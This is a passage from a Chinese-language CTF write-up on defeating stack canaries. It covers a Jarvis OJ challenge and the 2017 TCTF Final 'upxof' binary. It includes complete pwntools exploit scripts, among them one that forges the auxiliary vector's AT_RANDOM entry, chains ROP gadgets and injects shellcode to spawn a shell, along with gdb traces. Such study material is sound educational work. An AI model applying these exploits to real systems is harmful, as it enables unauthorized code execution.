0x00007ffff7ff7000 0x00007ffff7ffa000 r--p	[vvar]
0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp	[vdso]
0x00007ffff7ffc000 0x00007ffff7ffd000 r--p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p	/lib/x86_64-linux-gnu/ld-2.23.so
0x00007ffff7ffe000 0x00007ffff7fff000 rw-p	mapped
0x00007ffffffde000 0x00007ffffffff000 rw-p	[stack]
0xffffffffff600000 0xffffffffff601000 r-xp	[vsyscall]
```

那么 exp 如下：

```python
#!/usr/bin/env python
from pwn import *
context.log_level = 'debug'
p = remote('pwn.jarvisoj.com', 9877)
test = 0x40094E
flag = 0x400d20
p.recvuntil('What\'s your name?')
p.sendline(p64(flag) * 200)
p.recvuntil('Please overwrite the flag:')
p.sendline()
p.recvall()
p.interactive()
```

## Auxiliary Vector

直接“挖”到 `Canary` 产生的本源——AUXV(Auxiliary Vector)，并修改该结构体从而使 `Canary` 值可控。

### 2017-TCTF-Final-upxof

```bash
λ checksec ./upxof
[*] '/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
    Packer:   Packed with UPX
```

拖进 ida 里发现有壳，`upx -d` 一下：

```bash
λ upx -d upxof
                       Ultimate Packer for eXecutables
                          Copyright (C) 1996 - 2013
UPX 3.91        Markus Oberhumer, Laszlo Molnar & John Reiser   Sep 30th 2013

        File size         Ratio      Format      Name
   --------------------   ------   -----------   -----------
     10116 <-      6253   61.81%  linux/ElfAMD   upxof

Unpacked 1 file.
```

main 函数长这个样子，`gets` 这里显然有一个溢出点：

```cpp
int __cdecl main(int argc, const char **argv, const char **envp)
{
  char v4; // [rsp+0h] [rbp-410h]
  unsigned __int64 v5; // [rsp+408h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  setvbuf(stdin, 0LL, 2, 0LL);
  setvbuf(stdout, 0LL, 2, 0LL);
  setvbuf(stderr, 0LL, 2, 0LL);
  printf("let's go:", 0LL);
  gets(&v4);
  return 0;
}
```

但是在尝试的时候发现这里有 `Canary`，疑惑地重新 `checksec` 一下，发现脱了壳变得不一样了：

```bash
λ checksec ./upxof_no_upx
[*] '/home/assassinq/Course_4/2017-TCTF-Final-upxof/upxof_no_upx'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

这里又不能泄漏，于是就需要用另一种方法来搞定 `Canary`，就是改变 `auxv` 结构体中的内容。`auxv` 中包含了 `Canary` 的地址，在动态链接之前就已经确定。（[这篇文章](https://www.elttam.com.au/blog/playing-with-canaries/)讲得比较深入，还有 [phrack 上也有一篇文章](http://phrack.org/issues/58/5.html)）

`auxv` 结构可以在 [`elf/elf.h`](https://code.woboq.org/userspace/glibc/elf/elf.h.html) 里看到：

```cpp
/* Auxiliary vector.  */
/* This vector is normally only used by the program interpreter.  The
   usual definition in an ABI supplement uses the name auxv_t.  The
   vector is not usually defined in a standard <elf.h> file, but it
   can't hurt.  We rename it to avoid conflicts.  The sizes of these
   types are an arrangement between the exec server and the program
   interpreter, so we don't fully specify them here.  */
typedef struct
{
  uint32_t a_type;                /* Entry type */
  union
    {
      uint32_t a_val;                /* Integer value */
      /* We use to have pointer elements added here.  We cannot do that,
         though, since it does not work when using 32-bit definitions
         on 64-bit platforms and vice versa.  */
    } a_un;
} Elf32_auxv_t;
typedef struct
{
  uint64_t a_type;                /* Entry type */
  union
    {
      uint64_t a_val;                /* Integer value */
      /* We use to have pointer elements added here.  We cannot do that,
         though, since it does not work when using 32-bit definitions
         on 64-bit platforms and vice versa.  */
    } a_un;
} Elf64_auxv_t;
```

自己写一个带有 `Canary` 的程序，用 gdb 调一下，`info auxv` 查看结构体的内容：

```gdb
assassinq>> info auxv
33   AT_SYSINFO_EHDR      System-supplied DSO's ELF header 0x7ffff7ffa000
16   AT_HWCAP             Machine-dependent CPU capability hints 0xf8bfbff
6    AT_PAGESZ            System page size               4096
17   AT_CLKTCK            Frequency of times()           100
3    AT_PHDR              Program headers for program    0x400040
4    AT_PHENT             Size of program header entry   56
5    AT_PHNUM             Number of program headers      9
7    AT_BASE              Base address of interpreter    0x7ffff7dd7000
8    AT_FLAGS             Flags                          0x0
9    AT_ENTRY             Entry point of program         0x4004a0
11   AT_UID               Real user ID                   1000
12   AT_EUID              Effective user ID              1000
13   AT_GID               Real group ID                  1000
14   AT_EGID              Effective group ID             1000
23   AT_SECURE            Boolean, was exec setuid-like? 0
25   AT_RANDOM            Address of 16 random bytes     0x7fffffffe0e9
31   AT_EXECFN            File name of executable        0x7fffffffefc2 "/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary"
15   AT_PLATFORM          String identifying platform    0x7fffffffe0f9 "x86_64"
0    AT_NULL              End of vector                  0x0
```

[经过了解](https://my.oschina.net/ibuwai/blog/688107)，结构体中 `AT_RANDOM` 的值对应了 `canary` 的值（`The value is a pointer to sixteen random bytes provided by the kernel. The dynamic linker uses this to implement a stack canary`），可以测试一下：

```gdb
assassinq>> x/gx 0x7fffffffe0e9
0x7fffffffe0e9:	0x47747e045c58c8d8
assassinq>> canary
canary : 0x47747e045c58c800
```

还有比较重要的是，程序一开始 `AT_RANDOM`、`AT_EXECFN`、`AT_PLATFORM` 和其他的值都会被 push 到栈上：

```gdb
assassinq>> stack 1000
...
1280| 0x7fffffffe0b0 --> 0x7fffffffe0e9 --> 0x47747e045c58c8d8
1288| 0x7fffffffe0b8 --> 0x1f
1296| 0x7fffffffe0c0 --> 0x7fffffffefc2 ("/home/assassinq/Course_4/2017-TCTF-Final-upxof/canary")
1304| 0x7fffffffe0c8 --> 0xf
1312| 0x7fffffffe0d0 --> 0x7fffffffe0f9 --> 0x34365f363878 ('x86_64')
...
```

可以 `searchmem` 一下看到存放 `Canary` 的地方：

```gdb
assassinq>> searchmem 0x7fffffffe0e9
Searching for '0x7fffffffe0e9' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0x7fffffffe0b0 --> 0x7fffffffe0e9 --> 0x47747e045c58c8d8
assassinq>> searchmem 0x47747e045c58c800
Searching for '0x47747e045c58c800' in: None ranges
Found 2 results, display max 2 items:
 mapped : 0x7ffff7fda728 --> 0x47747e045c58c800
[stack] : 0x7fffffffdc78 --> 0x47747e045c58c800
```

最后基本上就可以知道 `Canary` 的起源是如下的方式：

```
kernel---->AT_RANDOM---->fs:[0x28]---->canary
```

那么思路就分成了两步：

1. 在程序还没有链接的时候把 `auxv` 的结构体覆盖，修改 `AT_RANDOM` 以设置 `Canary` 为已知的值
2. 接下来直接溢出做 ROP 或者直接跳到 shellcode 上

现在看来这个 upx 壳显然是有意义的。需要在没有被脱壳的情况下，没有被载入前覆盖掉 `auxv`。第一次加载壳的时候可以输入长为 `0x4096` 的字符串，前八位则要求必须是 `12345678` 才能过 check。接下来解壳之后就可以溢出。

这题主要是理解 AUXV 以及善用 gdb 调试。脚本：

```python
#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'

p = process('./upxof')

# id's of Auxillary Vectors
AT_SYSINFO_EHDR = 0x21
AT_HWCAP = 0x10
AT_PAGESZ = 0x06
AT_CLKTCK = 0x11
AT_PHDR = 0x03
AT_PHENT = 0x04
AT_PHNUM = 0x05
AT_BASE = 0x07
AT_FLAGS = 0x08
AT_ENTRY = 0x09
AT_UID = 0x0B
AT_EUID = 0x0C
AT_GID = 0x0D
AT_EGID = 0x0E
AT_SECURE = 0x17
AT_RANDOM = 0x19
AT_EXECFN = 0x1F
AT_PLATFORM = 0x0F
AT_NULL = 0x00

auxv = ''
#auxv += p64(AT_SYSINFO_EHDR) + p64(0x7ffff7ffd000)
#auxv += p64(AT_HWCAP) + p64(0x9f8bfbff)
#auxv += p64(AT_PAGESZ) + p64(4096)
#auxv += p64(AT_CLKTCK) + p64(100)
auxv += p64(AT_PHDR) + p64(0x400040) # needed
#auxv += p64(AT_PHENT) + p64(56)
auxv += p64(AT_PHNUM) + p64(2) # needed
#auxv += p64(AT_BASE) + p64(0x0)
#auxv += p64(AT_FLAGS) + p64(0x0)
auxv += p64(AT_ENTRY) + p64(0x400988) # needed
#auxv += p64(AT_UID) + p64(0)
#auxv += p64(AT_EUID) + p64(0)
#auxv += p64(AT_GID) + p64(0)
#auxv += p64(AT_EGID) + p64(0)
#auxv += p64(AT_SECURE) + p64(0)
auxv += p64(AT_RANDOM) + p64(0x601100) # Fake canary=0
#auxv += p64(AT_EXECFN) + p64(0x7fffffffeff0)
#auxv += p64(AT_PLATFORM) + p64(0x7fffffffe8e9)
auxv += p64(AT_NULL) + p64(0)

#gdb.attach(p)

payload = '12345678'
payload += p64(0) * 14 # offset
payload += p64(1) # argc
payload += p64(0x601100) # argv
payload += p64(0)
payload += p64(0x601100) * 10 # envp
payload += p64(0)
payload += auxv
p.recvuntil('password:')
p.sendline(payload)

pop_rdi_ret = 0x00000000004007f3
gets_plt = 0x00000000004005B0
buf = 0x601100
payload = '\x00' * 1048 + p64(pop_rdi_ret) + p64(buf) + p64(gets_plt) + p64(buf)
p.recvuntil(':')
p.sendline(payload)
p.sendline(asm(shellcraft.sh()))

p.interactive()
```

# 参考网站

https://ctf-wiki.github.io/ctf-wiki/pwn/linux/mitigation/canary/
https://www.anquanke.com/post/id/85203
https://bbs.ichunqiu.com/thread-44069-1-1.html
https://veritas501.space/2017/04/28/%E8%AE%BAcanary%E7%9A%84%E5%87%A0%E7%A7%8D%E7%8E%A9%E6%B3%95/
https://www.jianshu.com/p/c3624f5dd583
https://deadc0de.re/articles/microwave-write-up.html
https://braddaniels.org/csaw-quals-2017-scv/
https://reversingpwn.wordpress.com/2017/09/18/writeup-csaw-2017-scv/
https://n132.github.io/2019/02/25/2019-03-01-auxv-origin-of-canaries/
https://github.com/L4ys/CTF/blob/master/0ctf-final-2017/upxof/exp.py
https://github.com/D-I-E/writeups/tree/master/2017-ctfs/20170602-TCTF-Final/pwn-upxof
